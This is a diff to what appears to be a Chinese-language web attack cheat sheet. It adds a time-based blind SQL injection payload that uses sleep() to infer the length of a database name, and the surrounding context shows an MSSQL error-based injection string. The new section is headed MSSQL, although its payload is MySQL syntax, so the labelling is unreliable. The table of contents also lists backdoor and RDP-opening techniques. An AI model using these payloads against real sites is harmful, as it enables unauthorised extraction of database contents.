@@ -35,6 +35,7 @@ web常见漏洞：
 			* [oracle时间盲注](#oracle时间盲注)
 		* [mysql注入](#mysql注入)
 			* [mysql报错注入](#mysql报错注入)
+			* [mysql时间盲注](#mysql时间盲注)
 	* [命令及后门相关](#命令及后门相关)
 		* [开3389](#开3389)
 		* [运行计划任务](#运行计划任务)
@@ -300,6 +301,14 @@ file_name(@@version)
 ```
 ' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
 ```
+#### mssql时间盲注
+
+- 获取database长度
+```
+'and(select*from(select+if(length(database())=6,sleep(5),1))a/**/union/**/select+1)='a
+
+```
+
 
 #### mssql_waf绕过
 
